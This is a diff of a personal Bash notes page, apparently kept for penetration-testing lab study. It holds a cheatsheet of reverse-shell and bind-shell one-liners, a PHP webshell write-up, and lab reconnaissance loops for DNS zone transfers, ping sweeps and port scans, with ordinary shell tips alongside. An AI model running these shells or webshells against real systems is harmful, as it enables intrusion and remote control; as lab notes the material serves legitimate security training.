@@ -3,13 +3,23 @@
 Tags: #🤖
 Related to: 
 See also: 
-Previous: [[PROGRAMMING]], [[Getting Started]]
+Previous: [[PROGRAMMING]], [[Getting Started]], [[Introduction to Bash Scripting]]
 
 ## Description
 
-## Usage Examples
+## Cheatsheet
 
-### Cheatsheet
+| Command | Description |
+|-|-|
+| `nc -lvnp 1234` | Start a `nc` listener on a local port |
+| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/sh -i 2>&1 \| nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
+| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
+| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
+| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
+| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
+| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
 
 #### Auto-Complete
 
@@ -69,19 +79,53 @@ Previous: [[PROGRAMMING]], [[Getting Started]]
 
 `[CTRL] + [-]` - Zoom out.
 
-### Using shells
+## Usage Examples
 
-| Command | Description |
-|-|-|
-| `nc -lvnp 1234` | Start a `nc` listener on a local port |
-| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
-| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/sh -i 2>&1 \| nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
-| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
-| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
-| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
-| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
-| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
-| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
+### Get list of up hosts from subdomain list
+
+	for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
+
+```text
+blog.inlanefreight.com 10.129.24.93
+inlanefreight.com 10.129.27.33
+matomo.inlanefreight.com 10.129.127.22
+www.inlanefreight.com 10.129.127.33
+s3-website-us-west-2.amazonaws.com 10.129.95.250
+```
+
+	for zone in $(cat zones.txt); do dig axfr $zone.inlanefreight.htb @10.129.156.165; done
+
+```text
+; <<>> DiG 9.18.8-1-Debian <<>> axfr customers.inlanefreight.htb @10.129.156.165
+;; global options: +cmd
+; Transfer failed.
+
+; <<>> DiG 9.18.8-1-Debian <<>> axfr app.inlanefreight.htb @10.129.156.165
+;; global options: +cmd
+; Transfer failed.
+
+; <<>> DiG 9.18.8-1-Debian <<>> axfr ap.inlanefreight.htb @10.129.156.165
+;; global options: +cmd
+; Transfer failed.
+
+; <<>> DiG 9.18.8-1-Debian <<>> axfr citrix.inlanefreight.htb @10.129.156.165
+;; global options: +cmd
+; Transfer failed.
+
+; <<>> DiG 9.18.8-1-Debian <<>> axfr www2.inlanefreight.htb @10.129.156.165
+;; global options: +cmd
+; Transfer failed.
+```
+
+	for zone in $(cat zones.txt); do dig axfr $zone.inlanefreight.htb @10.129.156.165; done | grep axfr | cut -d ' ' -f7
+	
+```text
+customers.inlanefreight.htb
+app.inlanefreight.htb
+ap.inlanefreight.htb
+citrix.inlanefreight.htb
+www2.inlanefreight.htb
+```
 
 ### Scan each IP address in a list using Shodan
 
@@ -93,7 +137,7 @@ Previous: [[PROGRAMMING]], [[Getting Started]]
 
 	printenv | grep PATH
 
-```shell-session
+```text
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
 
@@ -101,7 +145,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/gam
 
 Add `/home/<user>/.local/bin`
 
-```shell-session
+```text
 export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/<user>/.local/bin"
 ```
 
@@ -111,7 +155,7 @@ Append the path to the end of the config file:
 
 	vim ~/.zshrc
 
-```shell-session
+```text
 export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/<user>/.local/bin"
 ```
 
@@ -121,18 +165,20 @@ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/l
 
 ### Ping sweep
 
-	for i in {1..255};      do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
-	for ip in $(seq 1 5);   do  ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.19.0.$ip"; done
+```bash
+for i in {1..255};      do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
+for ip in $(seq 1 5);   do  ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.19.0.$ip"; done
+```
 
 ### Portscan
 
-```sh
+```bash
 for port in 22 25 80 443 8080 8443; do
     (echo w00t > /dev/tcp/172.19.0.3/$port && echo "Open: $port") 2> /dev/null
 done
 ```
 
-```shell-session
+```text
 Open: 80
 ```
 
@@ -178,14 +224,13 @@ Transfer chisel to DANTE-WEB-NIX01:
 	nc -lvnp 80 < chisel	// in my Dante/www
 	bash -c "cat < /dev/tcp/10.10.16.52/80 > chisel"
 
-
 ### Redirect and Pipe
 
 #### Redirect errors to STDERR
 
 	find /etc/ -name shadow
 
-```shell-session
+```text
 find: ‘/etc/dovecot/private’: Permission denied
 /etc/shadow
 find: ‘/etc/ssl/private’: Permission denied
@@ -194,7 +239,7 @@ find: ‘/etc/polkit-1/localauthority’: Permission denied
 
 	find /etc/ -name shadow 2>/dev/null
 
-```shell-session
+```text
 /etc/shadow
 ```
 
@@ -218,7 +263,7 @@ find: ‘/etc/polkit-1/localauthority’: Permission denied
 
 	find /etc/ -name *.conf 2>/dev/null | grep systemd
 
-```shell-session
+```text
 /etc/systemd/system.conf
 /etc/systemd/timesyncd.conf
 /etc/systemd/journald.conf
@@ -229,7 +274,7 @@ find: ‘/etc/polkit-1/localauthority’: Permission denied
 
 	find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
 
-```shell-session
+```text
 7
 ```
 
@@ -239,7 +284,7 @@ find: ‘/etc/polkit-1/localauthority’: Permission denied
 	
 	echo 'export PS1="-[\[$(tput sgr0)\]\[\033[38;5;10m\]\d\[$(tput sgr0)\]-\[$(tput sgr0)\]\[\033[38;5;10m\]\t\[$(tput sgr0)\]]-[\[$(tput sgr0)\]\[\033[38;5;214m\]\u\[$(tput sgr0)\]@\[$(tput sgr0)\]\[\033[38;5;196m\]\h\[$(tput sgr0)\]]-\n-[\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]]\\$ \[$(tput sgr0)\]"' >> .bashrc
 
-```shell-session
+```text
 -[Tue Mar 23-00:39:51]-[cry0l1t3@parrot]-
 -[~]$ 
 ```
@@ -268,7 +313,7 @@ If we then host this script on our VPS, we can retrieve it from our customer's L
 
 #### Customized Bash Prompt
 
-```shell-session
+```text
 -[Wed Mar 24-11:27:15]-[user@workstation]-
 -[~]$ 
 ```
@@ -279,7 +324,7 @@ A simple designation of these scripts is also of great use. For example, suppose
 
 	cat customization-scripts.txt
 
-```shell-session
+```text
 Prompt.sh
 Tools.sh
 GUI.sh
@@ -299,7 +344,7 @@ With this command, each customization script is retrieved and executed one by on
 
 	cat tools.list
 
-```shell-session
+```text
 netcat
 ncat
 nmap
@@ -333,7 +378,7 @@ tmux
 
 	sudo apt install $(cat tools.list | tr "\n" " ") -y
 
-```shell-session
+```text
 Reading package lists... Done
 Building dependency tree
 Reading state information... Done
